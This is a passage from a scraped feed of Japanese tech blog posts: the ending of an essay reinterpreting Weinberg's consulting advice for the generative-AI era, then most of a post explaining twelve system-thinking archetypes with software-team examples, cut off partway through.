Conflict...でも、日本のECサイトのユーザーは、それを理解できない。追加しなければならなかったものは次の通りだ。日本語のエラーメッセージエラーコード（サポートが参照できる）エラーの原因と対処法のドキュメントサポートチーム向けのトラブルシューティングガイドAIは技術的に正しいものを作る。でも、使えるものを作るには、人間が必要だ。おわりにワインバーグ氏はコンサルタントの仕事を「人々に、彼らの要請に基づいて影響を及ぼす術」と定義した。40年が経った今、彼の洞察は色褪せるどころか、むしろ新たな意味を帯びている。生成AIという新しい存在が現れた今、私たちはワインバーグ氏の知恵をさらに一歩先へ進める必要がある。「人々に、彼らの要請に基づいて、彼らが本当に必要とする問いを見出す術」ワインバーグ氏が戦った相手は人間の非合理性だった。私たちが向き合うのは、それに加えて、確実性という幻想を振りまく生成AIだ。クライアントは答えを求める。AIは答えを与える。しかし本当に必要なのは、自ら問いを立て、判断し、責任を取る力だ。彼は「何かを失うための最良の方法は、それを離すまいともがくことだ」と教えた。私たちは今、知識への執着を手放す時だ。専門家の価値は「知っていること」から「判断できること」へ移行した。情報を所有することではなく、文脈を読み解くこと。完璧な答えを用意することではなく、正直に不確実性を語ること。彼は「依頼主に対してノーというのを恐れるようになったとき、人はコンサルタントとしての有効性を失う」と警告した。生成AIはノーと言わない。常にイエスだ。だからこそ、私たちはノーと言わねばならない。「それは実現できません」「今はその時ではありません」「別のアプローチをお勧めします」——この誠実さこそが、人間にしかできないことだ。彼は「あなたはそのシステムに、自分の命をあずける気がありますか」と問うた。私たちも問わねばならない。「AIが提案したこの解決策で、あなた自身の人生を賭けられますか」と。当事者意識のないアドバイスは無価値だ。AIには当事者意識がない。それは決定的な限界だ。ワインバーグ氏が発見した第三の道——非合理性に対して合理的になること——は、生成AI時代においてこう進化する。確実性の幻想に対して、不確実性と共に生きる勇気を示すこと形式知を使いこなしながら、暗黙知の価値を守ることAIの能力を認めつつ、人間としての責任を背負うことこれが、生成AI時代に必要なコンサルタントの秘密だ。ワインバーグ氏は40年前、人間の非合理性という複雑な問題に立ち向かうための知恵を残した。今、私たちはその知恵を土台として、さらに複雑な世界——人間の非合理性と、機械の見かけ上の合理性が交錯する世界——を生きねばならない。答えは美しい。しかし現実は泥にまみれている。その泥の中で、それでも前に進もうとする人々に寄り添い、時には厳しく、時には優しく、しかし常に誠実に——それが専門家の、人間の、仕事だ。午前5時、本番環境が復旧した。Slackに報告を書く。原因、対応、再発防止策。チームに共有する。プロセスを改善する。これが、人間の仕事だ。失敗から学び、次に活かすこと。生成AIは優れた相棒だ。しかし、責任を取るのは人間だ。判断するのは人間だ。そして、その判断に誇りを持つのも、人間だ。ワインバーグ氏が築いた基盤の上に、私たちは新しい時代の専門性を構築する。彼の知恵は古びない。むしろ、新しい挑戦の中でこそ、その真価を発揮する。それが、専門家の価値だと思う。再解釈生成AI時代の道具箱編も要望があれば書いていきたいです。コンサルタントの道具箱作者:ジェラルド・M・ワインバーグ日経BPAmazon","isoDate":"2025-10-08T00:17:49.000Z","dateMiliSeconds":1759882669000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"システム思考を使う人が知っておいてよい12のシステムアーキタイプ","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/06/074220","contentSnippet":"syu-m-5151.hatenablog.comsyu-m-5151.hatenablog.comはじめに正直に言いましょう。システム思考の理論を学んだとき、あなたはこう思いませんでしたか？「で、これをどう使うの?」前回と前々回の記事で、非線形性、フィードバックループ、氷山モデルを学びました。理論は美しく、説得力がありました。でも、実際の仕事に戻ると、こんな疑問が湧いてきます。「このぐちゃぐちゃな状況を、どう分析すればいいんだ?」「フィードバックループを見つけろって言われても、どこから探せばいいの?」「複雑すぎて、何が何だかわからない」そうですよね。私も同じでした。システム思考は強力なツールです。しかし、白いキャンバスの前に立たされて「さあ、目の前の構造システムとして分析してください」と言われても、最初の一筆をどこに置けばいいのか、途方に暮れてしまいます。でも、もし誰かがこう言ってくれたらどうでしょう。「その問題、見覚えがあります。実は、これは『問題の転嫁』という典型的なパターンなんです。こことここを見てください。ほら、この構造が見えますか? じゃあ、ここに介入すると効果的ですよ」突然、霧が晴れたように、問題の構造が見えてきます。これが、システムアーキタイプの力です。あなたが今日困っている問題—バグの再発、スケジュールの遅延、チームの対立、技術的負債の増大—これらの多くは、実は過去に何度も繰り返されてきた典型的なパターンなのです。新しい問題に見えても、その骨格は既知なのです。システムアーキタイプは、問題のパターン認識ツールです。12の主要なパターンを理解すれば、複雑に見える問題が「ああ、これはあのパターンだ」と認識できるようになります。診断ができれば、処方箋も見えてきます。この記事では、12のアーキタイプすべてを詳しく解説します。抽象的な図表だけではありません。各パターンについてどんな構造なのかなぜそのパターンが生まれるのかどんな具体例があるのか（特にソフトウェア開発の文脈で）よくある誤解や批判にどう答えるかどこに介入すれば効果的なのかすべてを、実践的な知識として提供します。学習曲線は存在します。12のパターンすべてを一度に覚える必要はありません。まずは1つか2つ、自分の問題に近いものから始めてください。「問題の転嫁」と「成長の限界」だけでも、驚くほど多くの問題が説明できることに気づくでしょう。準備はいいですか? では、パターンの世界へ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。はじめにシステムアーキタイプとはアーキタイプ:繰り返される構造の型研究の系譜と多様な分類なぜアーキタイプを学ぶのか図の重要性—そして、この記事の限界アーキタイプの構造的特徴12のシステムアーキタイプ1. 好循環/悪循環—成功と失敗の自己強化2. バランス型プロセスと遅延—調整の失敗3. うまくいかない解決策—短期的成功の罠問題の転嫁と成長の限界—2大重要パターン4. 問題のすり替わり—根本解決の機会損失5. 成長の限界—自らを制限する構造利害関係者の相互作用—競争と協力のダイナミクス6. 強者はますます強く—資源配分の不均衡7. 予期せぬ敵対関係—協力者が敵になる罠8. 共有地の悲劇—個人合理性と集団非合理性目標管理の失敗—期待と現実のギャップ9. バラバラの目標—対立する複数の目標10. 目標のなし崩し—徐々に下がる基準競争のダイナミクス—エスカレートの構造11. エスカレート—報復の応酬長期的成長の失敗—投資不足の罠12. 成長と投資不足—自らが生み出す限界アーキタイプを見抜く技術おわりにシステムアーキタイプとはアーキタイプ:繰り返される構造の型「アーキタイプ(archetype)」とは、「原型」という意味です。システムアーキタイプは、様々なシステムに繰り返し現れる、問題の構造的パターンの原型です。用語についてを少し説明しておきます。日本では「システム原型」という訳語の方が一般的に使われています。しかし、この記事では「システムアーキタイプ」という表現を使います。特にソフトウェアエンジニアにとっては、ソフトウェアアーキテクチャ、システムアーキテクチャといった「アーキテクチャ」という用語が馴染み深いため、「アーキタイプ」という言葉は直感的に理解しやすいでしょう。一方で、エンジニア以外の読者にとっては「原型」という日本語の方がイメージしやすいかもしれません。この記事ではエンジニアに限定せず幅広い読者を想定しているため、両方の観点から「アーキタイプ」という表現を採用しています。もし関連情報をウェブで検索する際は、「システム原型」で調べると、より多くの日本語資料が見つかるでしょう。aws.amazon.comcloud.google.comlearn.microsoft.com研究の系譜と多様な分類システムアーキタイプの概念は、数十年にわたる研究の蓄積の上に成り立っています。1960年代から1970年代にかけて、システムダイナミクスの創始者であるジェイ・フォレスター(Jay Forrester)がMITで始めた研究が源流です。彼とその教え子たち—デニス・メドウズ(Dennis Meadows)、ドネラ・メドウズ(Donella Meadows)ら—は、様々なシステムに繰り返し現れる構造パターンを観察し始めました。これが、後にシステムアーキタイプと呼ばれるものの萌芽でした。1980年代に入ると、マイケル・グッドマン(Michael Goodman)、チャールズ・キーファー(Charles Kiefer)、ジェニー・ケメニー(Jenny Kemeny)、そしてピーター・センゲ(Peter Senge)らが、ジョン・スターマン(John Sterman)の研究ノートも参考にしながら、これらのパターンを体系化していきました。彼らはこれを「システムテンプレート」として文書化し、実務での応用を試みました。そして1990年、ピーター・センゲが著書『学習する組織(The Fifth Discipline)』を出版しました。この本で、組織が陥りやすい典型的なシステムパターンが「システムアーキタイプ」として一般に紹介されたのです。センゲは、MITスローン経営大学院でシステム思考を研究し、組織学習の分野に大きな影響を与えました。学習する組織 ― システム思考で未来を創造する作者:ピーター・Ｍ・センゲ英治出版Amazon一方、ドネラ・メドウズは、システムダイナミクスの先駆者として、自然界から社会システムまで、あらゆる領域に現れる構造パターンを分析し続けました。彼女は著書『世界はシステムで動く(Thinking in Systems)』(2008年、彼女の死後出版)の第5章で、これらのパターンを「システムの罠(System Traps)」と呼びました。世界はシステムで動く ― いま起きていることの本質をつかむ考え方作者:ドネラ・Ｈ・メドウズ英治出版Amazonセンゲとメドウズ、二人のアプローチには興味深い違いがあります。センゲは「アーキタイプ」という用語で、繰り返し現れる構造パターンそのものに焦点を当てました。一方、メドウズは「罠(Trap)」という用語で、私たちがシステムの特性を十分に理解していないために陥る典型的な落とし穴として、より実践的・警告的な視点から紹介しました。罠という表現には、「気づかないうちにはまってしまう」「一度はまると抜け出しにくい」というニュアンスがあり、システムが生み出す問題の粘着性を強調しています。本質的には同じ現象を、異なる視点から捉えているのです。興味深いことに、研究者や文献によって、アーキタイプの数や分類は異なります。ピーター・センゲの『The Fifth Discipline』では付録に9〜10のアーキタイプが記載されています。デイヴィッド・ストローの『社会変革のためのシステム思考実践ガイド』では12のアーキタイプが詳述されています。その他の文献では8個のアーキタイプを扱うものや、研究者独自の分類を提示するものもあります。社会変革のためのシステム思考実践ガイド――共に解決策を見出し、コレクティブ・インパクトを創造する作者:デイヴィッド ピーター ストロー英治出版Amazonこの多様性は、システムアーキタイプが厳密な分類体系ではなく、実践的な診断ツールであることを示しています。重要なのは「何個あるか」ではなく、「自分が直面している問題がどのパターンに似ているか」を認識し、効果的な介入ポイントを見つけることです。彼らの研究が示したのは、問題の表面的な内容は異なっても、その背後にある構造は共通しているという洞察です。なぜアーキタイプを学ぶのか「また同じ問題が起きた」「なぜいつもこうなるんだ」——そう感じたことはありませんか?実は、私たちが日々直面する問題の多くは、過去に何度も繰り返されてきた典型的なパターンなのです。表面的には異なって見えても、深い構造は驚くほど似ています。システムアーキタイプは、この繰り返されるパターンを体系化したものです。システムアーキタイプを学ぶことには、5つの重要な価値があります。まず、問題認識の高速化です。一度アーキタイプを理解すれば、新しい問題に直面したとき、「これは○○のパターンだ」と素早く認識できます。ゼロから構造分析を始める必要はありません。優秀なシニアエンジニアがスタックトレースから根本原因を即座に見抜けるように、問題のパターンから構造を診断できるようになります。経験豊富なエンジニアが「このバグの出方、以前見たパターンに似ている」と気づくのと同じです。次に、先を読む能力が身につきます。アーキタイプには、予測可能な展開があります。「このパターンなら、次にこうなる」という先読みができるのです。例えば、「問題の転嫁」のパターンを認識したなら、症状対処への依存が強まり、やがて根本対処の能力が失われ、最終的にはシステムが崩壊することが予測できます。問題が深刻化する前に、早期に介入できるのです。さらに、効果的な介入ポイントの特定が可能になります。各アーキタイプには、効果的な介入ポイントが知られています。過去数十年にわたり、多くの組織で試行錯誤されてきた解決策を活用できます。これは車輪の再発明を避けることを意味します。ピーター・センゲ、ドネラ・メドウズ、デイヴィッド・ストローといった先駆者たちが発見した知恵を、そのまま使えるのです。アーキタイプは、チーム内で問題を議論するための共通言語にもなります。「これは成長の限界のパターンだ」「共有地の悲劇が起きている」と言えば、複雑な構造を説明するのに長々とした説明は不要です。「エスカレートのループに入っている」と言えば、構造を理解している人には即座に伝わります。この共通言語が、建設的な対話を可能にします。そして最も深い価値は、見方そのものが変わることです。アーキタイプを学ぶことで、「誰が悪いのか」ではなく「どんな構造がこの問題を生み出しているのか」と考えるようになります。個人を責めるのではなく、システムを変える。この視点の転換こそが、システム思考の真髄であり、アーキタイプ学習の最大の成果なのです。図の重要性—そして、この記事の限界ここで正直に告白します。システムアーキタイプをちゃんと理解するには、図(ループ図)が不可欠です。各アーキタイプは、強化ループ(R)とバランスループ(B)の組み合わせで表現されます。これらのループが互いにどう影響し合い、時間遅れがどこに存在し、どこに介入すれば効果的かは、図を見ることで直感的に理解できます。ただ、この記事では図を掲載していません。テキストだけでは限界があることを認めざるを得ません。だからこそ、強くお勧めします。デイヴィッド・ストローの『社会変革のためのシステム思考実践ガイド』を読んでください。この書籍には、12のシステムアーキタイプすべてについて、明確なループ図と豊富な実例が掲載されています。社会変革という文脈で書かれていますが、その洞察はソフトウェア開発にも直接応用できます。ピーター・センゲの『学習する組織』、ドネラ・メドウズの『世界はシステムで動く』も素晴らしい資料です。図とともに学ぶことで、この記事で説明する概念が、立体的に理解できるようになります。この記事は、アーキタイプへの入り口に過ぎません。真の理解は、図を見て、実践して、自分の課題に適用することで得られます。アーキタイプの構造的特徴すべてのシステムアーキタイプは、フィードバックループで構成されています。前回の記事で学んだように、フィードバックループには2種類あります。強化ループ(R)は変化を増幅させ、バランスループ(B)は目標に向けて調整します。システムアーキタイプは、これらのループの特定の組み合わせとして表現されます。そして、ループ間の相互作用や時間の遅れが、特徴的な問題パターンを生み出します。12のシステムアーキタイプここから、12のシステムアーキタイプを順に見ていきます。最初の3つは基本的なループパターンです。次の2つは最も重要なパターンとして深く掘り下げます。そして残りの7つも、実践に役立つ詳細とともに説明します。1. 好循環/悪循環—成功と失敗の自己強化最も基本的なパターン:自己強化型ループこれは、すべてのアーキタイプの基礎となる最もシンプルな構造です。変化が変化を生み、雪だるま式に増幅していくパターンです。構造:行動 →(+) 結果 →(+) さらなる行動  ↑                     │  │                     │  └─────────────────────┘  R(強化ループ):指数関数的な成長または衰退良いコードを書くと、レビューで学び、技術力が上がり、さらに良いコードを書けるようになる。問題を解決すると、自信がつき、難しい問題に挑戦し、さらに成長する。テストを書くと、バグが減り、開発が安定し、さらにテストを充実させる余裕が生まれる。これらは好循環の例です。一方、急いで実装すると、コードが汚くなり、変更が困難になり、さらに急いで実装せざるを得なくなる。バグが多いと、緊急対応に追われ、品質管理の時間がなくなり、さらにバグが増える。ドキュメントがないと、理解に時間がかかり、ドキュメントを書く時間がなくなり、さらに理解困難になる。これらは悪循環です。ここで立ち止まって考えてみましょう。「好循環と悪循環」という二分法は、現実を過度に単純化していないでしょうか。実際のシステムでは、好循環と悪循環が同時に存在することの方が多いのではないか。例えば、テストを書くことで開発が安定する一方で、テストのメンテナンスコストが増大し、それが新しいテストを書く障壁になることもあります。「好循環」と「悪循環」という明確な区別は、理論的には美しいが、実践的には曖昧なのではないか。確かに現実は、純粋な好循環も純粋な悪循環も稀です。重要な洞察は、好循環と悪循環は実は同じ構造だということです。違いは、ループがどちらの方向に回っているかだけなのです。そして、多くの場合、システムには複数のループが同時に存在し、互いに影響し合っています。テストを書くことによる安定化という好循環と、テストメンテナンスコストという悪循環が共存しているのです。だからこそ、どのループがより強く作用しているかを見極めることが重要なのです。理想的な好循環だけを目指すのではなく、悪循環の影響を最小化しながら、好循環を優位に保つ。これが現実的なアプローチです。ではどう介入するか。悪循環を断ち切るには、ループのどこか一箇所を意識的に変える必要があります。好循環を設計するには、小さな成功を積み重ね、自己強化のループに乗せることです。そして何より、初期条件に注意を払うこと。最初の一歩が、その後の軌道を決めるのです。あなたが今日書くコードの品質が、明日のあなたの開発速度を決めます。「急がば回れ」は、好循環と悪循環の分岐点を示す格言なのです。2. バランス型プロセスと遅延—調整の失敗目標追求のメカニズムとその落とし穴このアーキタイプは、目標と現状のギャップを埋めようとするバランスループに、時間遅延が加わったときに起こる問題を示します。構造:目標と現状のギャップ →(+) 行動 →(遅延)→ 結果 →(−) ギャップ       ↑                                        │       │                                        │       └────────────────────────────────────────┘       B(バランスループ):目標への調整パフォーマンス改善を考えてみましょう。改善の効果が本番で見えるまで数週間かかります。効果が見えないので、次々と最適化を追加してしまう。結果、過剰な最適化により、コードが複雑化し、逆にメンテナンスコストが増大することがあります。採用活動も同様です。採用してから戦力になるまで3〜6ヶ月かかります。人手不足を感じて大量採用すると、半年後には過剰になり、採用を停止する。すると1年後に再び不足する。組織の規模が周期的に変動してしまうのです。「遅延」を問題の根本原因とするこの見方は、人間の忍耐力の欠如を構造の問題にすり替えているだけではないでしょうか。つまり、問題は遅延そのものではなく、私たちが待つことができないという性質にあるのではないか。遅延は避けられない現実であり、それを「問題」として扱うことは、むしろ即座の結果を期待する文化を強化してしまうのではないか。確かに、遅延は問題ではなく、システムの自然な特性です。種を植えてから芽が出るまで時間がかかるのと同じように、多くのシステムには本質的な遅延が組み込まれています。問題は遅延そのものではなく、遅延を無視した行動を取ることなのです。ただ、ここで重要な反論がある。私たちは完璧に合理的な存在じゃない。認知的限界を持つ人間として、遅延は確かに過剰反応を引き起こす構造的要因なんだ。「待つことができない」という人間の性質を変えることは困難ですが、遅延を可視化し、先行指標を設定することで、この性質と折り合いをつけることはできます。この問題にどう対処するか。まず、遅延を可視化することです。「この行動の効果が見えるのはいつか?」を明確にします。次に、先行指標を設定します。最終結果を待たず、プロセスの改善を測定するのです。そして何より、忍耐強く待つこと。効果が出るまでの時間を理解し、過剰反応を避けることが重要です。3. うまくいかない解決策—短期的成功の罠応急処置が問題を悪化させる構造このアーキタイプは、短期的には効果のある解決策が、長期的には意図しない副作用を生み、かえって問題を悪化させるパターンです。構造:問題 →(+) 応急処置 →(短期)→(−) 問題症状  ↑                                │          (長期・遅延)                        └←(+) 意図せざる副作用 ←(+) 応急処置    B1:短期的な問題解決  R2:長期的な問題悪化プロジェクトの遅延に対して人を追加するという対応を考えてみましょう。一時的に作業量は増えます。しかし、教育コスト、コミュニケーションコスト、調整コストという意図せざる副作用が生まれます。長期的には、ブルックスの法則が示すように、さらに遅延することがあります。セキュリティ問題に対して厳しいルールを導入するという対応も同様です。一時的に安全に見えます。しかし、ユーザーが付箋にパスワードを書いたり、システムの回避方法を探したりする副作用が生まれます。長期的には、かえってセキュリティが脆弱化することがあるのです。ところで、この「副作用」という概念自体が恣意的じゃないだろうか。何を「主効果」とし、何を「副作用」とするかは、観察者の視点に依存します。人を追加することによる教育コストは「副作用」なのか、それとも「予測可能な必然的コスト」なのか。「副作用」という言葉は、予測できたはずの結果を予期しなかったことの言い訳になっていないか。確かに「副作用」という用語は、私たちの視野の狭さを隠蔽する危険性があります。多くの場合、「意図せざる」と呼ばれる結果は、実際には十分に予測可能だったのです。問題は副作用が存在することではなく、システム全体への影響を事前に考慮しなかったことにあります。とはいえ、ここで重要な現実がある。完全な予測は不可能だ。複雑なシステムでは、すべての相互作用を事前に把握することはできません。だからこそ、このアーキタイプは「副作用を避けよ」ではなく、「副作用を事前に予測し、監視し、早期に検出せよ」という教訓を与えているのです。「問題の転嫁」との違いに注意してください。「うまくいかない解決策」は単一の応急処置が副作用を生むパターンです。一方、「問題の転嫁」は症状対処と根本対処の競合のパターンです。構造は似ていますが、微妙に異なります。どう介入すればよいか。まず、副作用を事前に予測します。「この解決策の意図しない結果は何か?」と問うのです。次に、時間軸を長くとる。3ヶ月後、1年後、この解決策はどう機能しているかを想像します。そして、小規模な実験を行う。いきなり全面適用せず、まず小さく試して副作用を観察するのです。問題の転嫁と成長の限界—2大重要パターン次の2つのアーキタイプは、最も頻繁に現れ、最も深刻な影響を与えるパターンです。4. 問題のすり替わり—根本解決の機会損失短期的対処が長期的問題を生む構造このアーキタイプは、問題の症状に対する応急処置(症状対処)と、問題の根本原因を解決する根治療法(根本対処)が競合し、症状対処が根本対処を妨げるパターンです。構造:問題の症状 →(+) 症状対処 →(−) 症状(一時的軽減)     ↑                            │     │                            │     └────────────────────────────┘  B1:応急処置ループ     問題の症状 ←(+) 問題の根本原因                    ↑                   (−)遅延・困難                    │               根本対処 ←(−) 症状対処への依存                              B2:根本解決ループ               R3:依存の強化ループ重要な構造的特徴を理解しましょう。症状対処は速く、簡単ですが、根本原因は放置されます。根本対処は遅く、困難ですが、本質的に問題を解決します。そして、症状対処を繰り返すと、それへの依存が強まり、根本対処の能力が低下していくのです。バグが発生したとき、パッチを当てたり条件分岐を追加したりするのは症状対処です。設計を見直したり、テストを追加したり、リファクタリングしたりするのが根本対処です。クイックフィックスに慣れると、設計力が低下し、さらにクイックフィックスに頼るようになります。依存の強化ループが回り始めるのです。でも「症状対処」を悪とし、「根本対処」を善とする二元論は、現実の複雑さを見落としていないでしょうか。緊急の本番障害に対して「まず根本原因を特定してから対処しよう」と言えるでしょうか。時には症状対処こそが正しい選択であり、常に根本対処を追求することは、かえって組織を硬直させるのではないか。また、何が「症状」で何が「根本原因」かは、分析の深さによって相対的に変わるのではないか。この批判は実務的に重要な指摘です。確かに、症状対処をゼロにすることは非現実的です。本番障害が起きている最中に、「設計を見直そう」と悠長なことは言えません。また、「根本原因」という概念自体が相対的です。あるレベルで「根本原因」と思っていたものが、さらに深い分析では「症状」に過ぎないこともあります。このアーキタイプの本質は、症状対処を排除することではなく、症状対処への依存を警告することにある。症状対処と根本対処のバランスが重要なのです。緊急時には症状対処で凌ぎ、落ち着いたら根本対処に取り組む。この戦略的な使い分けができるかどうかが、システムの長期的な健全性を決めます。AI生成コードへの過度な依存も、このパターンです。実装方法がわからないという症状に対して、AIに全部聞いて生成されたコードをそのまま使うのは症状対処です。自分で考え、調べ、試行錯誤するのが根本対処です。AIへの依存が習慣化すると、自力で考える力が低下し、さらにAIに頼るようになります。序章で述べた生成AIの非対称性は、まさにこの「問題の転嫁」アーキタイプなのです。このシステムは予測可能な振る舞いパターンを示します。問題が発生し、症状対処で成功体験を得て、そのパターンが固定化され、依存が形成され、問題が悪化し、最終的にシステムが崩壊します。ではどう介入すればよいか。まず、時間の遅れを理解することです。根本対処の効果が現れるまでには時間がかかります。この遅延を理解し、忍耐強く待つ必要があります。次に、症状対処の副作用を可視化します。短期的利益は明確ですが、長期的コストは見えにくい。これを意図的に可視化するのです。根本対処は小さく始めることができます。いきなり全部をリファクタリングするのではなく、最も影響の大きい1つのモジュールだけ改善する。小さな成功体験が、次の一歩への推進力になります。症状対処をゼロにする必要はありません。戦略的に使うのです。根本対処が効果を発揮するまでの「つなぎ」として、意識的に症状対処を使うことができます。そして、環境を変えることも効果的です。症状対処が容易にできる環境では、人はそちらに流されます。環境を変えて、根本対処を選びやすくするのです。5. 成長の限界—自らを制限する構造成長が自らを制限する構造何かが順調に成長し始めます。最初は加速的に伸びていきます。しかし、ある時点から急に成長が鈍化し、やがて停滞する。このパターンが「成長の限界」です。構造:                    R(強化ループ:成長エンジン)       ┌──────────────────────────────┐       │                              │    行動 →(+) 成果 →(+) モチベーション →(+)       ↑       │       │      (+)       │       ↓       │    制約条件の悪化       │       │       │      (−)  B(バランスループ:制約)       │       │       └───────┘スキル習得を考えてみましょう。練習すると上達し、自信がつき、さらに練習するという強化ループがあります。しかし、現在の学習方法の限界、基礎知識の不足、時間の制約という制約に直面します。結果として「プラトー(停滞期)」に陥ります。仕事の生産性も同様です。効率化すると、仕事が早く終わり、達成感を得て、さらに効率化するという強化ループがあります。しかし、時間は有限、エネルギーは有限、レビュアーの対応速度には限界があります。一定の生産性で頭打ちになるのです。チームの拡大にも限界があります。メンバーを追加すると、開発力が増加し、プロジェクトが進展します。しかし、コミュニケーションコスト(n(n-1)/2)、教育コスト、意思決定の複雑化という制約に直面します。ブルックスの法則が示すように、「遅れているプロジェクトに人員を追加すると、さらに遅れる」のです。「成長の限界」という概念は、成長を当然の善とする前提に立っていないでしょうか。なぜ成長が鈍化することが「問題」なのか。持続可能なシステムとは、無限に成長し続けるシステムではなく、安定した規模で均衡を保つシステムではないのか。このアーキタイプは、成長至上主義を無批判に受け入れているように見えます。確かに、無限の成長は物理的に不可能であり、また望ましくもありません。生態系における「クライマックス群落」のように、成熟したシステムは成長を止めて安定することがあります。成長の鈍化を常に問題視することは、成長至上主義を強化してしまうかもしれません。ここで重要な区別がある。このアーキタイプが問題とするのは、意図しない制約による成長の停止だ。意図的に選択した安定状態と、制約を認識せずに陥った停滞は、まったく異なります。前者は戦略的判断ですが、後者は機会の損失なのです。さらに言えば、「成長」は必ずしも規模の拡大を意味しません。質的な成長、効率の向上、適応力の増加といった形の成長もあります。このアーキタイプの真の教訓は、「無限に成長せよ」ではなく、「制約を認識し、意識的に選択せよ」なのです。このシステムは予測可能な振る舞いを示します。加速的成長期、減速期、停滞期を経て、介入がなければ衰退期に入ります。効果的な介入には、エリヤフ・ゴールドラットの「制約理論」が役立ちます。まず、制約を特定します。何がシステムの成長を制限しているのか、ボトルネックを見つけるのです。次に、制約を最大限活用します。制約を取り除く前に、現在の制約を最大限に活用できているかを確認します。そして、制約を緩和します。制約を拡大したり、取り除いたりします。最後に、新しい制約に備えます。一つの制約を緩和すると、別の制約が顕在化するからです。誤った介入は、成長が鈍化したときに強化ループをさらに強化しようとすることです。スキルが伸びないからといって、さらに同じ方法で練習量を増やしても、制約は解消されません。しばしば状況を悪化させます。システム思考の洞察はこうです。問題は強化ループの弱さではなく、バランスループの制約の存在です。成長を再開させるには、強化ループを強化するのではなく、バランスループの制約を緩和する必要があるのです。利害関係者の相互作用—競争と協力のダイナミクス次の3つのアーキタイプは、複数の当事者間の相互作用が生み出すパターンです。6. 強者はますます強く—資源配分の不均衡勝者総取りの構造このアーキタイプは、限られたリソースを競う2つ以上の活動で、成功した方がより多くのリソースを得て、さらに成功し、最終的には一方が独占する構造です。構造:活動Aの成功 →(+) Aへのリソース配分      ↓                ↓      └────────→(+) 活動Aの成功                          ↕ (限られたリソース)                    活動Bの成功 →(−) Bへのリソース配分の減少      ↓                ↓      └────────→(−) 活動Bの成功            R1:Aの自己強化ループ      R2:Bの自己弱体化ループ機能開発の偏りを考えてみましょう。評価が高い機能Aにリソースが集中すると、さらに改善が進み、さらに評価が上がります。一方、新規機能Bはリソース不足で品質が低く、評価が下がり、さらにリソースが削られます。結果として、機能Bの開発機会が永遠に失われるのです。チーム間のリソース競争も同様です。成果を出したチームAが予算増を得ると、さらに成果を出し、さらに予算が増えます。一方、チームBは予算削減され、人材が流出し、さらに成果が出なくなります。組織全体の多様性が失われていきます。個人の成長機会の偏在も深刻です。優秀なエンジニアAに重要タスクが集中すると、スキルアップし、さらに重要タスクが回ってきます。一方、新人Bには簡単なタスクのみが割り当てられ、成長機会がなく、さらに差が開きます。組織の持続可能性が損なわれるのです。このアーキタイプは、まるで「強者」が不当に利益を得ているかのように描かれています。しかし、成果を出した者にリソースを集中させることは、組織全体の効率を最大化する合理的な戦略ではないでしょうか。能力主義を否定することは、かえって組織の競争力を損なうのではないか。このアーキタイプは、平等主義的イデオロギーを科学的な装いで正当化しているだけではないか。確かに、短期的な効率を追求するなら、成果を出している活動にリソースを集中させることは合理的です。問題は、この戦略が長期的にはシステム全体の脆弱性を増大させることにあります。重要なのは、「強者」個人の善悪ではなく、システムの構造です。このアーキタイプが警告しているのは、初期のわずかな差が構造によって増幅され、取り返しのつかない格差になることです。これは正義の問題ではなく、システムの多様性と適応力の問題なのです。一つの機能だけに集中投資したシステムは、市場が変化したとき脆弱です。一つのチームだけに依存する組織は、そのチームが崩壊したとき機能不全に陥ります。多様性の喪失は、システムの長期的な生存を脅かすのです。どう介入すればよいか。まず、競争構造を協力構造に変えることです。「どちらが勝つか」ではなく「両方を成功させる」という目標に転換します。次に、機会ベースの配分を行います。過去の成果ではなく、将来の可能性に基づいてリソースを配分するのです。意図的な多様性の維持も重要です。短期的な効率より、長期的な適応力を重視します。そして、定期的に初期条件をリセットします。「ゼロから再評価」の機会を設けるのです。このアーキタイプが示す重要な洞察は、「成功は能力よりも構造が決める」ということです。初期のわずかな差が、システムの構造によって増幅され、決定的な差になっていくのです。7. 予期せぬ敵対関係—協力者が敵になる罠パートナーが敵になる構造このアーキタイプは、本来は協力すべきパートナーが、互いの行動が相手を害していると誤解し、対立関係に陥るパターンです。構造:R1: Win-Winループ(意図)A の成功 ←→ 協力 ←→ Bの成功    ↑                    ↑    │  B2               │  B3   (−) Aの解決策       (−) Bの解決策    │  ↓               │  ↓    ↓  (意図せざる妨害) ↓Aの成功 ←────────────→ Bの成功         R4: 悪循環ループ(結果)フロントエンドとバックエンドの対立を考えてみましょう。双方ともユーザー価値を高めたいという意図があります。フロントエンドが表現力を高めるために複雑なAPIを要求すると、バックエンドの開発負荷が増大します。バックエンドがAPI設計をシンプルにすると、フロントエンドの表現力が制限されます。互いに「相手のせいで価値を出せない」と感じ、対立が深まっていくのです。品質保証チームと開発チームの対立も同様です。双方とも高品質な製品を届けたいという意図があります。QAが厳格なテストを実施すると、開発のリリース速度が低下します。開発がテストを簡略化するよう要求すると、品質が低下し、QAの目標達成が困難になります。互いに「相手が協力的でない」と感じるようになります。このアーキタイプは、対立を「誤解」の問題として扱っていますが、本当にそうでしょうか。フロントエンドとバックエンドの利害は、構造的に対立しているのではないか。QAと開発の目標は、本質的に矛盾しているのではないか。「共通の目標」という美しい理想を掲げても、現実には各チームには異なるKPIがあり、異なる評価基準があります。対立を「コミュニケーション不足」のせいにすることは、構造的な問題から目を逸らしているだけではないか。確かに、単なる「誤解」として片付けられない構造的な対立は存在します。フロントエンドとバックエンドが異なる上司に報告し、異なる評価基準で測られているなら、対立は必然です。このアーキタイプの深い洞察は、まさにその点にある。組織の構造が対立を生み出しているんだ。問題は個人の悪意や誤解ではなく、インセンティブ構造なのです。だからこそ、コミュニケーションだけでは不十分で、組織構造そのものを変える必要があるのです。例えば、フロントエンドとバックエンドを同じチームに統合する。QAと開発を共通の品質指標で評価する。こうした構造的な変更なしに、「協力しろ」と言っても意味がありません。どう介入すればよいか。まず、共通の目標を再確認します。「相手を打ち負かす」ではなく「共に成功する」という目標に立ち返るのです。しかし、これは単なる精神論ではなく、共通の評価指標を設定するという具体的な行動を伴う必要があります。次に、意図せざる妨害を可視化します。「私のこの行動が、相手にどんな影響を与えているか?」を明示的に確認します。一緒に解決策を設計することも重要です。一方的な解決策ではなく、双方の制約を理解した上での協働設計を行います。そして、定期的なコミュニケーションの場を設けます。問題が深刻化する前に、小さな違和感を話し合うのです。このアーキタイプが示す重要な洞察は、「善意から生まれる悲劇」です。誰も悪意はないのに、システムの構造が対立を生み出してしまうのです。8. 